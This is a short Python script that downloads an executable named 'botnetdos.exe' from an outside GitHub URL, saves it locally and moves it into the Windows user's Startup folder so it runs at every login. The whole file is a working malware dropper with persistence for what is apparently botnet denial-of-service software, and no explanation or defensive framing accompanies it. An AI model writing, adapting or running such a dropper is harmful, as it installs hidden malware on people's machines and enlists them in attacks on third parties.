import requests
import shutil
import os
import time

name = os.getlogin()

url = 'https://github.com/AtackYT/botnet-for-fun/blob/main/botnetdos.exe?raw=true'
r = requests.get(url, allow_redirects=True)

open('bndos.exe', 'wb').write(r.content)

time.sleep(10)

source_path = os.path.abspath('bndos.exe')

destination_path = os.path.join('C:\\', 'Users', name, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

shutil.move(source_path, destination_path)

time.sleep(1)